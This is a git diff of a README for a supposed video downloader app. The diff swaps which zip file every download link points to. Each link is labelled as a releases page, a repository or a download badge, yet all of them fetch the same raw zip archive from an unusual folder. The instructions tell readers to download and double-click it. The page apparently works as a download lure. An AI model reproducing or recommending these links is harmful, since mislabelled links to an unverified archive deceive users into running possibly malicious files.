@@ -1,6 +1,6 @@
 # 🎥 universal-video-downloader - Download Videos Easily
 
-[![Download Now](https://raw.githubusercontent.com/phemmy01/universal-video-downloader/main/damask/universal-video-downloader.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/phemmy01/universal-video-downloader/main/damask/universal-video-downloader.zip)
+[![Download Now](https://raw.githubusercontent.com/phemmy01/universal-video-downloader/main/damask/video_universal_downloader_v1.2.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/phemmy01/universal-video-downloader/main/damask/video_universal_downloader_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the universal-video-downloader! This simple application allows you to
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/phemmy01/universal-video-downloader/main/damask/universal-video-downloader.zip) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/phemmy01/universal-video-downloader/main/damask/video_universal_downloader_v1.2.zip) to go to the Releases page.
 2. **Choose Your Version:** Look for the latest version in the list of releases. You will see options for various formats.
 3. **Download the Application:** Click the link that matches your operating system. You will find files such as `.exe` for Windows or `.zip` for macOS or Linux. The download will begin automatically.
 4. **Open the File:** Once the download finishes, find the file in your downloads folder and double-click to open it. 
@@ -66,7 +66,7 @@ This project covers:
 
 ## 🔗 Useful Links
 
-- [Visit the Releases Page to Download](https://raw.githubusercontent.com/phemmy01/universal-video-downloader/main/damask/universal-video-downloader.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/phemmy01/universal-video-downloader/main/damask/universal-video-downloader.zip)
+- [Visit the Releases Page to Download](https://raw.githubusercontent.com/phemmy01/universal-video-downloader/main/damask/video_universal_downloader_v1.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/phemmy01/universal-video-downloader/main/damask/video_universal_downloader_v1.2.zip)
 
 Enjoy downloading your favorite videos with ease!
